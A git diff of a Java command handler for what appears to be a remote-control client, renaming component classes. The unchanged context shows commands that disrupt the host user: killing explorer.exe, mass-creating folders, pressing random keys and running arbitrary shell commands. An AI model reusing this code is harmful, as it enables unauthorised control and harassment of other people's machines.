@@ -4,8 +4,8 @@ package br.com.introcdc.connect.client.commands.control;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ControlComponents;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientControlComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 
 import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
@@ -45,7 +45,7 @@ public class ClientCommandFunctions extends ClientCommand {
             msg("Criando 1000 pastas...");
             try {
                 for (int i = 1; i <= 1000; i++) {
-                    new File(FileComponents.FOLDER, String.valueOf(i)).mkdir();
+                    new File(ClientFileComponents.FOLDER, String.valueOf(i)).mkdir();
                 }
             } catch (Exception exception) {
                 msg("Ocorreu um erro ao criar 1000 pastas! (" + exception.getMessage() + ")");
@@ -55,10 +55,10 @@ public class ClientCommandFunctions extends ClientCommand {
             msg("1000 pastas criadas!");
         } else if (input.equalsIgnoreCase("desktop")) {
             msg("Forçado usuário para ir para ir para a área de trabalho!");
-            ControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_WINDOWS);
-            ControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_D);
-            ControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_D);
-            ControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_WINDOWS);
+            ClientControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_WINDOWS);
+            ClientControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_D);
+            ClientControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_D);
+            ClientControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_WINDOWS);
         } else if (input.equalsIgnoreCase("killexplorer")) {
             msg("Matando desktop...");
             exec("taskkill /f /IM explorer.exe");
@@ -201,8 +201,8 @@ public class ClientCommandFunctions extends ClientCommand {
                 new Thread(() -> {
                     while (KEYBOARD) {
                         int randomKey = KeyEvent.VK_A + random.nextInt(26);
-                        ControlComponents.ROBOT_INSTANCE.keyPress(randomKey);
-                        ControlComponents.ROBOT_INSTANCE.keyRelease(randomKey);
+                        ClientControlComponents.ROBOT_INSTANCE.keyPress(randomKey);
+                        ClientControlComponents.ROBOT_INSTANCE.keyRelease(randomKey);
                         try {
                             Thread.sleep(200);
                         } catch (Exception ignored) {
@@ -221,7 +221,7 @@ public class ClientCommandFunctions extends ClientCommand {
                 try {
                     boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
                     String inputInfo = (windows ? "cmd /c " : "") + command;
-                    File directory = new File(FileComponents.FOLDER);
+                    File directory = new File(ClientFileComponents.FOLDER);
 
                     ProcessBuilder processBuilder = new ProcessBuilder();
                     processBuilder.command(inputInfo.split(" "));
